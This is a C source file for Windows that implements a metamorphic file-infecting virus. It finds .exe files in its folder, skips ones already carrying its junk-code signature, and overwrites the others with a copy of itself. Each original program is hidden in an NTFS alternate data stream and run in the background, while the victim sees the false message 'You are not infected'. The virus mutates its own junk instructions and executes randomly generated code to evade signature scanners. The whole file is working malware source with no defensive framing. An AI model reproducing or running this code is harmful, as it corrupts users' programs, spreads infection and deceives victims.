#include <dirent.h> 
#include <stdio.h> 
#include <windows.h>
#include <string.h>
#include <time.h>

typedef unsigned char byte;
typedef void (*pfunc)(void);

/* union for dynamic code generation and execution */
union funcptr {
  pfunc x;
  byte* y;
};

#define PUSH 0x50
#define POP  0x58
#define NOP 0X90
#define JUNK asm("PUSH %esi\n\t""PUSH %ecx\n\t""PUSH %edx\n\t""PUSH %ebx\n\t""POP %esi\n\t""POP %ecx\n\t""POP %edx\n\t""POP %ebx\n\t");
#define JUNKLEN 8

#define MAX 10

char *st = ".exe";
char *exes[MAX];
unsigned char *code;
int codelen;

/* function for Dynamic Code Generation and Execution */

void dynamic_code_gene() {
  int cnt;
  unsigned char c,reg;
  /* Allocating Virutal Memory which has read write and execute permissions*/
  byte* buf = (byte*)VirtualAllocEx( GetCurrentProcess(), 0, 1<<16, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
  srand(time(NULL));
  if( buf==0 ) 
    return;
  byte* p = buf;
  cnt = rand()%7;
  while(cnt)
  {
   reg = rand()%3;
   c = PUSH + reg;
  *p++ = c; 
  *p++ = c+8; 
   cnt--;
  }
  *p++ = 0xC3; // ret
  union funcptr func;
  func.y = buf;
 
  func.x();   // Calling the dynamic generated Code
}

/* this function reads Code from a given file name */

void readcode(const char *filename) {
  FILE *fp = fopen(filename, "rb");    
  fseek(fp, 0L, SEEK_END);             
  codelen = ftell(fp);
  code = malloc(codelen);              
  fseek(fp, 0L, SEEK_SET);
  fread(code, codelen, 1, fp);         
}

unsigned int sum4(int i)
{
 unsigned int sum;
 sum = code[i]+code[i+1]+code[i+2]+code[i+3];
 return sum;
}
/* function to modify the JUNK Code */
void replace_junk(void) {
  FILE *fp = fopen("vir.exe", "rb+");    
  fseek(fp, 0L, SEEK_END);             
  codelen = ftell(fp);
  code = malloc(codelen);              
  fseek(fp, 0L, SEEK_SET);
  fread(code, codelen, 1, fp);
  long int i,j;
  int sk;
  srand(time(NULL));                                 
  int c,cnt=0;
  JUNK;
  for (i = 0; i < codelen; i++) {
    unsigned start = code[i];
    unsigned end = code[i+JUNKLEN-1];
    /* finds the pattern and replaces those instruction with some other random codes */
    if(start >= PUSH && start <= PUSH+8)
    {
      if(end >= POP && end <= POP+8)
	{
	  if(sum4(i) == (sum4(i+4)-32))
	  {
            cnt++;
	    sk = i;
	    for(j=0;j<4;j++)
            {
              int reg = rand()%8;
 	      if(reg == 4)
		continue;
              fseek(fp, sk, SEEK_SET);
              c = PUSH + reg;
	      fputc(c, fp);
	      fseek(fp, sk+4, SEEK_SET);
              c = c + 8;
 	      fputc(c, fp);
	    }
	  }	
	}
     }
  }
  JUNK;
  //printf("The total count is %d",cnt);
}

/* finds Junk Pattern to avoid reinfecting the infected file */
int find_junkpattn(void)
{
  int i,cnt=0;                      
  JUNK;
  for (i = 0; i < codelen; i++) {
    unsigned start = code[i];
    unsigned end = code[i+JUNKLEN-1];
    if(start >= PUSH && start <= PUSH+8)
    {
      if(end >= POP && end <= POP+8)
	{
	  if(sum4(i) == (sum4(i+4)-32))
	  {
	    cnt++;
	  }	
	}
    }
  }
  return cnt;
}

/* get .exe files in the folder */
int get_exes(char *str)
{
  int noofexes,i = 0;
  DIR           *d;
  struct dirent *dir;
  d = opendir(str);
  JUNK;
  if (d)
  {
    while ((dir = readdir(d)) != NULL)
    {
      if((strstr(dir->d_name,st)) != NULL)
      {
       //printf("%s\n", dir->d_name);
       exes[i] =  malloc(strlen(dir->d_name) + 1);
       strcpy(exes[i++],dir->d_name);
      }
    }
    closedir(d);
  }
  JUNK;
  return 0;
}
void infect(int i)
{
 char *buffer;
 int cx,c;
 c = 50;
 buffer = malloc(c);
 cx = snprintf ( buffer,c,"cmd.exe /C \"copy %s tmp.exe > nul 2>&1\"", exes[i]);
 system(buffer);
 cx = snprintf ( buffer,c,"cmd.exe /C \"copy vir.exe %s > nul 2>&1\"", exes[i]);
 system(buffer);
 cx = snprintf (buffer,c,"cmd.exe /C \"type tmp.exe > %s:org.exe\"",exes[i]);
 system(buffer);
 system("rm tmp.exe");
 printf("\nHey Don't worry,You are not infected\n\n");
}

/* Junk fun to insert Code randomly */

void jun_fn(i)
{
 while(i--)
 {
  srand(time(NULL));
  switch(rand()%5)
  {
   case 0:asm("PUSH %eax\n\t""POP %eax\n\t");
	 break;
   case 1:asm("INC %eax\n\t""DEC %eax\n\t");
	 break;
   case 2:asm("PUSH %esi\n\t""POP %esi\n\t");
         break;
   case 3:asm("INC %ebx\n\t""DEC %ebx\n\t");
	 break;
   case 4:asm("NOP\n\t""NOP\n\t");
         break;
  }
 }
}  


int main(int argc,char *argv[])
{
  srand(time(NULL));
  int i=0;
  jun_fn(rand()%7);
  char *buffer;
  JUNK;
  buffer = malloc(50);
  JUNK;
  dynamic_code_gene();
  JUNK;
  for(i=0;i<MAX;i++)
     exes[i] = NULL;
  jun_fn(rand()%7);
  get_exes(".");
  i = 0;
  jun_fn(rand()%7);
  dynamic_code_gene();
  while(exes[i])
  {
   readcode(exes[i]);
   if(!(find_junkpattn()))
   {
	infect(i);
   	if((strcmp(argv[0],"./vir")))
   	{
        replace_junk();
     	snprintf (buffer,50,"cmd.exe /C start /B %s.exe:org.exe",argv[0]);
     	system(buffer);
   	}
        break;
   }
   i++;
  }
   JUNK;
   
   return(0);
}
